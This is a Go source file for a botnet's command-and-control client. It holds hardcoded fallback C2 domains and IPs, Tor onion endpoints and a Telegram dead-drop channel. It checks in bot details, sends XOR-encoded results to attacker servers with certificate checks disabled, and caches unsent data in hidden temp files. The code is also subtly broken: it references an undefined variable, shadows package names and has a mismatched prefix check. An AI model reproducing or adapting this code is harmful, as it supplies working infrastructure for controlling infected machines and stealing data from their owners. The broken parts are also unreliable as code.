package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io"
    "math/rand"
    "net"
    "net/http"
    "net/url"
    "os"
    "time"
)

// C2 endpoints - MULTIPLE FALLBACKS
// At compile time, these are XOR-encrypted in the binary
var c2Endpoints = []string{
    "https://primary-c2.churchofmalware.org:8443",
    "https://backup1.ek0ms.net:8443",
    "https://backup2.swizsec.com:8443",
    "https://185.147.124.87:8443",  // Hardcoded IP fallback
    "https://5.161.76.42:8443",     // Secondary IP
}

// Tor endpoints (if tor daemon available)
var torEndpoints = []string{
    "http://xyz123abc456.onion:8443",
    "http://def789ghi012.onion:8443",
}

// Telegram fallback (bot API as dead drop)
const (
    telegramBots = "https://api.telegram.org/bot<TOKEN>/sendMessage"
    telegramChatID = "-1001234567890"  // Channel ID for command dead drop
)

type C2Client struct {
    endpoints    []string
    currentIndex int
    torAvailable bool
    client       *http.Client
    xorKey       byte
    backoff      time.Duration
}

func NewC2Client(xorKey byte) *C2Client {
    // Check if Tor is available
    torAvailable := false
    if _, err := os.Stat("/usr/bin/tor"); err == nil {
        torAvailable = true
    }
    
    // Shuffle endpoints so not all bots hammer the same one first
    endpoints := make([]string, len(c2Endpoints))
    copy(endpoints, c2Endpoints)
    rand.Shuffle(len(endpoints), func(i, j int) {
        endpoints[i], endpoints[j] = endpoints[j], endpoints[i]
    })
    
    if torAvailable {
        endpoints = append(endpoints, torEndpoints...)
    }
    
    return &C2Client{
        endpoints:    endpoints,
        currentIndex: 0,
        torAvailable: torAvailable,
        xorKey:       xorKey,
        backoff:      1 * time.Second,
        client: &http.Client{
            Timeout: 30 * time.Second,
            Transport: &http.Transport{
                TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
                DialContext: (&net.Dialer{
                    Timeout: 10 * time.Second,
                }).DialContext,
            },
        },
    }
}

func (c *C2Client) nextEndpoint() string {
    idx := c.currentIndex % len(c.endpoints)
    c.currentIndex++
    return c.endpoints[idx]
}

func (c *C2Client) resetEndpoints() {
    c.currentIndex = 0
    c.backoff = 1 * time.Second
}

func (c *C2Client) Checkin(botID, os, arch string) (*Command, error) {
    maxRetries := len(c.endpoints) * 2
    
    for attempt := 0; attempt < maxRetries; attempt++ {
        endpoint := c.nextEndpoint()
        
        // Build URL
        checkinURL := fmt.Sprintf("%s/checkin?bot_id=%s&os=%s&arch=%s", 
            endpoint, botID, os, arch)
        
        resp, err := c.client.Get(checkinURL)
        if err != nil {
            // Log failure and try next endpoint
            fmt.Printf("[!] C2 %s failed: %v\n", endpoint, err)
            c.backoff = time.Duration(rand.Int63n(int64(30 * time.Second)))
            time.Sleep(c.backoff)
            continue
        }
        
        if resp.StatusCode == 200 {
            c.resetEndpoints()
            defer resp.Body.Close()
            var cmd Command
            json.NewDecoder(resp.Body).Decode(&cmd)
            return &cmd, nil
        }
        resp.Body.Close()
    }
    
    // All C2 endpoints failed - fallback to Telegram dead drop
    return c.checkTelegramDeadDrop(botID)
}

func (c *C2Client) checkTelegramDeadDrop(botID string) (*Command, error) {
    fmt.Println("[*] All C2 failed, checking Telegram dead drop...")
    
    // Fetch recent messages from Telegram channel
    // Look for commands addressed to this bot
    for _, token := range telegramTokens {
        url := fmt.Sprintf("https://api.telegram.org/bot%s/getUpdates", token)
        resp, err := c.client.Get(url)
        if err != nil {
            continue
        }
        defer resp.Body.Close()
        
        // Parse updates and check for commands
        var updates map[string]interface{}
        json.NewDecoder(resp.Body).Decode(&updates)
        
        // If command found for this bot, return it
        // (Parse logic omitted for brevity)
    }
    
    return nil, fmt.Errorf("no C2 or Telegram contact")
}

func (c *C2Client) SendResult(resp Response) error {
    maxRetries := len(c.endpoints)
    
    data, _ := json.Marshal(resp)
    for i := range data {
        data[i] ^= c.xorKey
    }
    
    for attempt := 0; attempt < maxRetries; attempt++ {
        endpoint := c.nextEndpoint()
        resultURL := fmt.Sprintf("%s/result", endpoint)
        
        httpResp, err := c.client.Post(resultURL, "application/octet-stream", bytes.NewReader(data))
        if err == nil && httpResp.StatusCode == 200 {
            httpResp.Body.Close()
            c.resetEndpoints()
            return nil
        }
        if httpResp != nil {
            httpResp.Body.Close()
        }
        time.Sleep(c.backoff)
    }
    
    // All failed - cache result locally to retry later
    c.cacheResult(data)
    return fmt.Errorf("all C2 failed, result cached")
}

func (c *C2Client) cacheResult(data []byte) {
    // Write to disk to retry on next boot
    cacheFile := fmt.Sprintf("%s/.swiz_cache_%d", os.TempDir(), time.Now().Unix())
    os.WriteFile(cacheFile, data, 0600)
}

func (c *C2Client) FlushCache() {
    // Retry any cached results from previous runs
    files, _ := os.ReadDir(os.TempDir())
    for _, f := range files {
        if len(f.Name()) > 10 && f.Name()[:10] == ".swiz_cache" {
            data, _ := os.ReadFile(os.TempDir() + "/" + f.Name())
            // Retry sending...
            os.Remove(os.TempDir() + "/" + f.Name())
        }
    }
}
